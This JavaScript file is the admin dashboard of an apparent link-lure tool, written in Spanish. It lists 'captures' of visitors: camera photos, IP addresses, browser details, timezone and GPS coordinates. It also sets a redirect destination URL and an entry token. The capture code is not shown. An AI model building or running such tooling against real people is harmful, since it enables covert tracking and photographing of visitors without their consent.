(function () {
  var loginView = document.getElementById('loginView');
  var dashboardView = document.getElementById('dashboardView');
  var currentPage = 1;
  var totalPages = 1;

  function el(id) {
    return document.getElementById(id);
  }

  function fmtDate(utc) {
    if (!utc) return '—';
    try {
      var d = new Date(utc.replace(' ', 'T') + 'Z');
      return d.toLocaleString();
    } catch (e) {
      return utc;
    }
  }

  function escapeHtml(s) {
    if (s === null || s === undefined) return '';
    return String(s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function truncate(s, n) {
    if (!s) return '—';
    return s.length > n ? s.slice(0, n) + '…' : s;
  }

  function showLogin() {
    loginView.hidden = false;
    dashboardView.hidden = true;
  }

  function showDashboard(username) {
    loginView.hidden = true;
    dashboardView.hidden = false;
    el('currentUser').textContent = username;
    loadSettings();
    loadCaptures();
  }

  function api(path, options) {
    return fetch(path, options).then(function (r) {
      return r.json().catch(function () {
        return {};
      }).then(function (data) {
        if (!r.ok) throw new Error(data.error || 'Error de servidor');
        return data;
      });
    });
  }

  function loadSettings() {
    api('/admin/api/settings').then(function (data) {
      el('destinationUrl').value = data.destination_url || '';
      el('entryToken').value = data.entry_token || '';
    }).catch(function () {
      location.reload();
    });
  }

  function loadCaptures() {
    api('/admin/api/captures?page=' + currentPage).then(function (data) {
      var grid = el('grid');
      var empty = el('emptyState');
      grid.innerHTML = '';
      el('totalBadge').textContent = data.total;

      totalPages = Math.max(1, Math.ceil(data.total / data.perPage));
      currentPage = Math.min(currentPage, totalPages);
      el('pageInfo').textContent = 'Página ' + currentPage + ' de ' + totalPages;
      el('prevPage').disabled = currentPage <= 1;
      el('nextPage').disabled = currentPage >= totalPages;

      if (!data.captures.length) {
        empty.hidden = false;
        return;
      }
      empty.hidden = true;

      data.captures.forEach(function (c) {
        var card = document.createElement('div');
        card.className = 'capture-card';

        var media = c.filename
          ? '<img src="/captures/' + encodeURIComponent(c.filename) + '" loading="lazy" alt="Captura">'
          : '<div class="no-photo">Sin foto (permiso denegado)</div>';

        var coords = c.lat !== null && c.lng !== null
          ? c.lat + ', ' + c.lng
          : '—';

        card.innerHTML =
          media +
          '<div class="meta">' +
          '<div><strong>IP:</strong> ' + escapeHtml(c.ip || '—') + '</div>' +
          '<div><strong>Referrer:</strong> ' + escapeHtml(truncate(c.referrer, 60)) + '</div>' +
          '<div><strong>Navegador:</strong> ' + escapeHtml(truncate(c.user_agent, 60)) + '</div>' +
          '<div><strong>Idioma:</strong> ' + escapeHtml(c.lang || '—') + '</div>' +
          '<div><strong>Zona:</strong> ' + escapeHtml(c.tz || '—') + '</div>' +
          '<div><strong>Ubicación:</strong> ' + escapeHtml(coords) + '</div>' +
          '<div class="date">' + fmtDate(c.created_at) + '</div>' +
          '</div>';

        grid.appendChild(card);
      });
    }).catch(function () {
      location.reload();
    });
  }

  el('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var username = el('username').value.trim();
    var password = el('password').value;
    api('/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: username, password: password })
    }).then(function () {
      el('loginError').textContent = '';
      showDashboard(username);
    }).catch(function (err) {
      el('loginError').textContent = err.message;
    });
  });

  el('logoutBtn').addEventListener('click', function () {
    api('/admin/logout', { method: 'POST' }).then(function () {
      location.reload();
    });
  });

  el('settingsForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var destinationUrl = el('destinationUrl').value.trim();
    var entryToken = el('entryToken').value.trim();
    api('/admin/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ destination_url: destinationUrl, entry_token: entryToken })
    }).then(function (data) {
      el('destinationUrl').value = data.destination_url;
      el('entryToken').value = data.entry_token;
      var msg = el('settingsMsg');
      msg.textContent = 'Cambios guardados.';
      setTimeout(function () {
        msg.textContent = '';
      }, 3000);
    }).catch(function (err) {
      var msg = el('settingsMsg');
      msg.textContent = err.message;
      msg.className = 'error';
      setTimeout(function () {
        msg.textContent = '';
        msg.className = 'success';
      }, 3000);
    });
  });

  el('prevPage').addEventListener('click', function () {
    if (currentPage > 1) {
      currentPage--;
      loadCaptures();
    }
  });

  el('nextPage').addEventListener('click', function () {
    if (currentPage < totalPages) {
      currentPage++;
      loadCaptures();
    }
  });

  api('/admin/api/me').then(function (data) {
    if (data.authenticated) {
      showDashboard(data.username);
    } else {
      showLogin();
    }
  });
})();
